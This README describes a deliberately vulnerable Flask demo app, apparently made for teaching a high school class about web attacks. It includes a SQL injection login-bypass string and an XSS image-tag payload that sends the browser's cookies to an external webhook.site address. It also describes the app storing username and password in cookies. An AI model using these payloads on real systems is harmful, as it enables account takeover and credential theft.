# Flask SQL Injection Demo
This is a small demonstration of how a SQL injection might look like, written for a presentation in front of a highschool class.

## SQL Injection
The server hosts an index page with a login to demonstrate a SQL injection, e.g. 
```sql
admin'; --
```
in the user input, to successfully log in with any password. The correct password for the admin account is admin123.

After sucessfully logging in, there is a button that redirects to the posts page, which can also be reached by link. 

However, only after a successful login, will the browser set a username and password cookie from the database, which can then be used for demonstratin the XSS attack.

## XSS Attack
On the posts page, the user can create new posts, including such posts that use HTML elements. This can be used for a XSS attack, e.g.:
```html
<img src="x" onerror="fetch('https://webhook.site/mywebhook?cookies='+document.cookie);">

```
Which will send the browser cookies to your webhook website, demonstrating the dangers of XSS attacks.

If you want to show arbitrary code execution you can generate HTML-Elements with arbitrary code execution, e.g.: with alerts. If you find them annoying, you can remove them by clicking on the red cross (from wikipedia, background removed).

You can reach the server via localhost:5000
## Pictures in static
- red cross
    - By Yerson_O, CC BY-SA 3.0, https://commons.wikimedia.org/w/index.php?curid=2588992, white background removed
